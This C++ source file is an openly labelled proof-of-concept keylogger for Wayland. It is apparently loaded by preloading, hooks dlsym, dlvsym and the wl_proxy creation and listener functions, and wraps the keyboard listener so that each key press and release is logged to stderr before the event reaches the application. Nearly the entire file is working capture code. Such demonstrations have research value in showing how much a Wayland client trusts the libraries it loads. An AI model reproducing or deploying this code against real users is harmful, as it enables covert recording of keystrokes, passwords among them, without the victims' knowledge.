/*
Copyright (c) 2012-2014 Maarten Baert <maarten-baert@hotmail.com>

Permission to use, copy, modify, and/or distribute this software for any purpose with or without fee is hereby granted, provided that the above copyright notice and this permission notice appear in all copies.

THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
*/

#include "elfhacks.h"

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <wayland-client.h>

struct wl_proxy* my_wl_proxy_create(struct wl_proxy *factory, const struct wl_interface *interface);
struct wl_proxy* my_wl_proxy_marshal_array_constructor(struct wl_proxy *proxy, uint32_t opcode, union wl_argument *args, const struct wl_interface *interface);
int my_wl_proxy_add_listener(struct wl_proxy *factory, void (**implementation)(void), void *data);

void *(*g_real_dlsym)(void*, const char*) = NULL;
void *(*g_real_dlvsym)(void*, const char*, const char*) = NULL;
struct wl_proxy* (*g_real_wl_proxy_marshal_array_constructor)(struct wl_proxy*, uint32_t, union wl_argument*, const struct wl_interface*);
struct wl_proxy* (*g_real_wl_proxy_create)(struct wl_proxy*, const struct wl_interface*);
int (*g_real_wl_proxy_add_listener)(struct wl_proxy*, void (**)(void), void*);

int g_hooks_initialized = 0;

void init_hooks() {
	
	if(g_hooks_initialized)
		return;
	
	fprintf(stderr, "[wayland-keylogger] init_hooks begin.\n");
	fprintf(stderr, "[wayland-keylogger] Note: This is only a proof-of-concept. It is not perfect.\n");
	fprintf(stderr, "[wayland-keylogger] It depends on Wayland internals and will need an update\n");
	fprintf(stderr, "[wayland-keylogger] whenever those internals change. The last Wayland/Weston\n");
	fprintf(stderr, "[wayland-keylogger] version that has been tested with this program is 1.4.0.\n");
	fprintf(stderr, "[wayland-keylogger] You are using version %s.\n", WAYLAND_VERSION);
	
	// part 1: get dlsym and dlvsym
	eh_obj_t libdl;
	if(eh_find_obj(&libdl, "*/libdl.so*")) {
		fprintf(stderr, "[wayland-keylogger] Can't open libdl.so!\n");
		exit(-181818181);
	}
	if(eh_find_sym(&libdl, "dlsym", (void **) &g_real_dlsym)) {
		fprintf(stderr, "[wayland-keylogger] Can't get dlsym address!\n");
		eh_destroy_obj(&libdl);
		exit(-181818181);
	}
	if(eh_find_sym(&libdl, "dlvsym", (void **) &g_real_dlvsym)) {
		fprintf(stderr, "[wayland-keylogger] Can't get dlvsym address!\n");
		eh_destroy_obj(&libdl);
		exit(-181818181);
	}
	eh_destroy_obj(&libdl);
	
	// part 2: get everything else
	g_real_wl_proxy_create = (struct wl_proxy* (*)(struct wl_proxy*, const struct wl_interface*))
		g_real_dlsym(RTLD_NEXT, "wl_proxy_create");
	g_real_wl_proxy_marshal_array_constructor = (struct wl_proxy* (*)(struct wl_proxy*, uint32_t, union wl_argument*, const struct wl_interface*))
		g_real_dlsym(RTLD_NEXT, "wl_proxy_marshal_array_constructor");
	g_real_wl_proxy_add_listener = (int (*)(struct wl_proxy*, void (**)(void), void*))
		g_real_dlsym(RTLD_NEXT, "wl_proxy_add_listener");
	
	fprintf(stderr, "[wayland-keylogger] init_hooks end.\n");
	
	g_hooks_initialized = 1;
	
}

struct Hook {
	const char* name;
	void* address;
};
Hook hook_table[] = {
	{"wl_proxy_create", (void*) &my_wl_proxy_create},
	{"wl_proxy_marshal_array_constructor", (void*) &my_wl_proxy_marshal_array_constructor},
	{"wl_proxy_add_listener", (void*) &my_wl_proxy_add_listener},
};

struct KeyLoggerData {
	void (**implementation)(void);
	void *data;
};

void MyHandleKeyboardKeymap(void* data, wl_keyboard* keyboard, uint32_t format, int fd, uint32_t size) {
	KeyLoggerData *d = (KeyLoggerData*) data;
	((wl_keyboard_listener*) d->implementation)->keymap(d->data, keyboard, format, fd, size);
}
void MyHandleKeyboardEnter(void* data, wl_keyboard* keyboard, uint32_t serial, wl_surface* surface, wl_array* keys) {
	KeyLoggerData *d = (KeyLoggerData*) data;
	((wl_keyboard_listener*) d->implementation)->enter(d->data, keyboard, serial, surface, keys);
}
void MyHandleKeyboardLeave(void* data, wl_keyboard* keyboard, uint32_t serial, wl_surface* surface) {
	KeyLoggerData *d = (KeyLoggerData*) data;
	((wl_keyboard_listener*) d->implementation)->leave(d->data, keyboard, serial, surface);
}
void MyHandleKeyboardKey(void* data, wl_keyboard* keyboard, uint32_t serial, uint32_t time, uint32_t key, uint32_t state) {
	KeyLoggerData *d = (KeyLoggerData*) data;
	if(state) {
		fprintf(stderr, "[wayland-keylogger] Pressed key %d\n", key);
	} else {
		fprintf(stderr, "[wayland-keylogger] Released key %d\n", key);
	}
	((wl_keyboard_listener*) d->implementation)->key(d->data, keyboard, serial, time, key, state);
}
void MyHandleKeyboardModifiers(void* data, wl_keyboard* keyboard, uint32_t serial, uint32_t mods_depressed, uint32_t mods_latched, uint32_t mods_locked, uint32_t group) {
	KeyLoggerData *d = (KeyLoggerData*) data;
	((wl_keyboard_listener*) d->implementation)->modifiers(d->data, keyboard, serial, mods_depressed, mods_latched, mods_locked, group);
}

wl_keyboard_listener my_keyboard_listener = {
	MyHandleKeyboardKeymap,
	MyHandleKeyboardEnter,
	MyHandleKeyboardLeave,
	MyHandleKeyboardKey,
	MyHandleKeyboardModifiers,
};

struct wl_proxy* g_keyboard_to_log = NULL;

// for older Wayland versions
struct wl_proxy* my_wl_proxy_create(struct wl_proxy *factory, const struct wl_interface *interface) {
	//fprintf(stderr, "[wayland-keylogger] my_wl_proxy_create(factory=%p, interface=%p)\n", factory, interface);
	struct wl_proxy* id = g_real_wl_proxy_create(factory, interface);
	if(interface == &wl_keyboard_interface) {
		fprintf(stderr, "[wayland-keylogger] Got keyboard id!\n");
		g_keyboard_to_log = id;
	}
	return id;
}

// for newer wayland versions
struct wl_proxy* my_wl_proxy_marshal_array_constructor(struct wl_proxy *proxy, uint32_t opcode, union wl_argument *args, const struct wl_interface *interface) {
	//fprintf(stderr, "[wayland-keylogger] my_wl_proxy_marshal_array_constructor(proxy=%p, opcode=%u, args=%p, interface=%p)\n", proxy, opcode, args, interface);
	struct wl_proxy* id = g_real_wl_proxy_marshal_array_constructor(proxy, opcode, args, interface);
	if(interface == &wl_keyboard_interface) {
		fprintf(stderr, "[wayland-keylogger] Got keyboard id!\n");
		g_keyboard_to_log = id;
	}
	return id;
}

int my_wl_proxy_add_listener(struct wl_proxy *factory, void (**implementation)(void), void *data) {
	//fprintf(stderr, "[wayland-keylogger] my_wl_proxy_add_listener(factory=%p, implementation=%p, data=%p)\n", factory, implementation, data);
	if(g_keyboard_to_log != NULL && factory == g_keyboard_to_log) {
		fprintf(stderr, "[wayland-keylogger] Adding fake listener!\n");
		g_keyboard_to_log = NULL;
		KeyLoggerData *d = new KeyLoggerData(); // memory leak, I know :)
		d->implementation = implementation;
		d->data = data;
		return g_real_wl_proxy_add_listener(factory, (void (**)(void)) &my_keyboard_listener, d);
	} else {
		return g_real_wl_proxy_add_listener(factory, implementation, data);
	}
}

// override existing functions

extern "C" struct wl_proxy* wl_proxy_create(struct wl_proxy *factory, const struct wl_interface *interface) {
	init_hooks();
	return my_wl_proxy_create(factory, interface);
}

extern "C" struct wl_proxy* wl_proxy_marshal_array_constructor(struct wl_proxy *proxy, uint32_t opcode, union wl_argument *args, const struct wl_interface *interface) {
	init_hooks();
	return my_wl_proxy_marshal_array_constructor(proxy, opcode, args, interface);
}

extern "C" int wl_proxy_add_listener(struct wl_proxy *factory, void (**implementation)(void), void *data) {
	init_hooks();
	return my_wl_proxy_add_listener(factory, implementation, data);
}

extern "C" void* dlsym(void* handle, const char* symbol) {
	init_hooks();
	for(unsigned int i = 0; i < sizeof(hook_table) / sizeof(Hook); ++i) {
		if(strcmp(hook_table[i].name, symbol) == 0) {
			fprintf(stderr, "[wayland-keylogger] Hooked: dlsym(%s).\n", symbol);
			return hook_table[i].address;
		}
	}
	return g_real_dlsym(handle, symbol);
}

extern "C" void* dlvsym(void* handle, const char* symbol, const char* version) {
	init_hooks();
	for(unsigned int i = 0; i < sizeof(hook_table) / sizeof(Hook); ++i) {
		if(strcmp(hook_table[i].name, symbol) == 0) {
			fprintf(stderr, "[wayland-keylogger] Hooked: dlvsym(%s,%s).\n", symbol, version);
			return hook_table[i].address;
		}
	}
	return g_real_dlvsym(handle, symbol, version);
}
